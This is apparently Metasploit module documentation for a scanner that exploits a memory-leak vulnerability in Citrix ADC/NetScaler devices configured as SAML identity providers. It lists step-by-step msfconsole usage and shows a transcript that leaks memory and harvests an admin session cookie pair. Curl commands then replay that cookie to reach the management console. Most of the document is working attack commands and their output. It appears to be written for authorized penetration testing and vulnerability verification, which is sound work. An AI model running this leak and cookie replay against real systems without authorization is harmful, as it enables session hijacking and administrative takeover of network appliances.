## Vulnerable Application

This module scans for a vulnerability that allows a remote, unauthenticated attacker to leak memory from a
target Citrix ADC server configured as a SAML IdP. The leaked memory is then scanned for session cookies
which can be hijacked if found.

## Verification Steps

1. Start msfconsole
2. `use auxiliary/scanner/http/citrix_netscaler_cve_2026_3055 `

Configure the target:

3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_HTTP_OR_HTTPS_PORT>` (If different from the default of 443)
5. `set SSL true` (Or set to false if targeting HTTP)

You can check if the target is vulnerable. The leaked data is not inspected. Intended to identify
patched and vulnerable systems.

6. `check`

Run the module to leak data and potentially leak session cookies.

7. `run`

## Options

- `LEAK_REQUEST_COUNT`: The number of HTTP requests per host to try and leak data when exploiting the vulnerability.
The more requests, the more data leaked, but also the longer the scan takes. Default is 4096.

- `CHECK_REQUEST_COUNT`: The maximum number of HTTP requests per host to try and leak data when checking for the
vulnerability. Default is 4.
 
## Scenarios

### Example 1

Targeting a vulnerable `NS13.1: Build 59.19.nc` instance which has been configured as a SAML IdP. An admin session
in the management interface was established separately, so we know a valid session is available to leak.

```
msf > use auxiliary/scanner/http/citrix_netscaler_cve_2026_3055 
msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) > show options 

Module options (auxiliary/scanner/http/citrix_netscaler_cve_2026_3055):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   LEAK_REQUEST_COUNT  4096             yes       The number of HTTP requests per host to try and leak data when exploiting the vulnerability
   CHECK_REQUEST_COUNT 4                yes       The maximum number of HTTP requests per host to try and leak data when checking for the vulnerability
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, htt
                                                  p, socks5, socks5h
   RHOSTS                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
                                                  tml
   RPORT               443              yes       The target port (TCP)
   SSL                 true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI           /                yes       Base path
   THREADS             1                yes       The number of concurrent threads (max one per host)
   VHOST                                no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) > set RHOST 192.168.86.141
RHOST => 192.168.86.141
msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) > set RPORT 8443
RPORT => 8443
msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) > check
[*] 192.168.86.141:8443 - The target appears to be vulnerable. Response contains an NSC_TASS cookie.
msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) > run
[*] 192.168.86.141:8443   - The target is vulnerable. Leaked 2368104 bytes, but did not leak any session cookies.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) > run
[*] 192.168.86.141:8443   - The target is vulnerable. Leaked 2358889 bytes, but did not leak any session cookies.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) > run
[*] 192.168.86.141:8443   - The target is vulnerable. Leaked 2049100 bytes, but did not leak any session cookies.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) > run
[+] 192.168.86.141:8443   - Leaked cookie pair: SESSID=5e43a6c810ddfa663a481c29aa3d012c; NITRO_SK=6LBvaEmhxTaJH7GGCXy3TPhRzu16tvEBzNyMWg7%2BGa8%3D
[*] 192.168.86.141:8443   - The target is vulnerable. Leaked 1797954 bytes, and 1 unique session cookies pairs.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/citrix_netscaler_cve_2026_3055) >
```

In the above example we leaked a `SESSID` cookie. If we know the IP address of the management interface (which may or may
not be the same IP as the RHOST), we can verify the session with a simple curl query. Below we see a GET request to
`/menu/neo` without the cookie results in a redirect to an error page, while the same request with the leaked cookie
returns a 200 OK and the expected HTML content.

Alternatively, if we leak an `NSC_AAAC` session cookie, we can use it to access the user portal (which is
the RHOST:RPORT web interface).

```
$ curl -ik https://192.168.86.140/menu/neo
HTTP/1.1 307 Temporary Redirect
Date: Mon, 30 Mar 2026 16:12:18 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline' https://cdn-web.citrix.com/can.cdn/marketing/assets/fonts/citrix-fonts-linking.css; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self'; img-src 'self' data: blob:; font-src 'self' data: https://cdn-web.citrix.com/can.cdn/marketing/assets/fonts/citrix-sans/; frame-ancestors 'self'; object-src 'none';
Location: /menu/er?error=SESSION_CORRUPTED
Feature-Policy: camera 'none'; microphone 'none'; geolocation 'none'
Referrer-Policy: no-referrer
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 0
Content-Type: text/html; charset=UTF-8

$ curl -ik https://192.168.86.140/menu/neo --cookie "SESSID=5e43a6c810ddfa663a481c29aa3d012c; NITRO_SK=6LBvaEmhxTaJH7GGCXy3TPhRzu16tvEBzNyMWg7%2BGa8%3D"
HTTP/1.1 200 OK
Date: Mon, 30 Mar 2026 16:12:31 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline' https://cdn-web.citrix.com/can.cdn/marketing/assets/fonts/citrix-fonts-linking.css https://citrix-adc-content.customer.pendo.io https://data.pendo.io https://pendo-static-6508245000126464.storage.googleapis.com https://pendo-static-5175857953112064.storage.googleapis.com; script-src 'self' 'unsafe-eval' https://app.pendo.io https://citrix-adc-data.customer.pendo.io https://citrix-adc-content.customer.pendo.io https://data.pendo.io https://pendo-static-6508245000126464.storage.googleapis.com https://pendo-static-5175857953112064.storage.googleapis.com; connect-src 'self' https://app.pendo.io https://s3.amazonaws.com; img-src 'self' data: blob: https://citrix-adc-content.customer.pendo.io https://citrix-adc-data.customer.pendo.io https://data.pendo.io https://pendo-static-6508245000126464.storage.googleapis.com https://pendo-static-5175857953112064.storage.googleapis.com; frame-src 'self' https://app.pendo.io; font-src 'self' data: https://cdn-web.citrix.com/can.cdn/marketing/assets/fonts/citrix-sans/; frame-ancestors 'self'; object-src 'none';
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: startupapp=neo; expires=Thu, 25-Mar-2027 16:12:31 GMT; Max-Age=31104000; path=/; SameSite=Lax
Feature-Policy: camera 'none'; microphone 'none'; geolocation 'none'
Referrer-Policy: no-referrer
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 1531
Content-Type: text/html;application/octet-stream;application/ecmascript;application/json;application/xml;charset=UTF-8

<!DOCTYPE html PUBLIC "-//W3C//DTD XDEV_HTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Citrix ADC VPX - Configuration</title>
<link rel="icon" type="image/ico" href="/favicon.ico"/>
<link href="/admin_ui/rdx/core/css/rdx.css" rel="stylesheet" type="text/css"/>
<link href="/admin_ui/neo/css/neo.css" rel="stylesheet" type="text/css"/>
<link href="/admin_ui/gui_v2/libs/rdx_v2/rdx_v2.css" rel="stylesheet" type="text/css"/>
<!--[if IE]> <style type="text/css"> .form td input[type="submit"] { width: 50px; } </style> <![endif]-->
<script type="text/javascript" src="/menu/neoglobaldata"></script>
<script type="text/javascript" src="/admin_ui/rdx/core/js/cytoscape.umd.js"></script>
<script type="text/javascript" src="/admin_ui/rdx/core/js/rdx.js"></script>
<script type="text/javascript" src="/menu/branding"></script>
<script type="text/javascript" src="/admin_ui/neo/js/neo.js"></script>
<script type="text/javascript" src="/admin_ui/gui_v2/libs/rdx_v2/rdx_v2.js"></script>
<script type="text/javascript" src="/admin_ui/gui_v2/configuration/ssl_bundle.js"></script>
<script type="text/javascript" src="/admin_ui/neo/js/epa_expression_data_win.js"></script>
<script type="text/javascript" src="/admin_ui/neo/js/epa_expression_data_mac.js"></script>
</head>
<body class="ns_body">
</body>
</html>
```
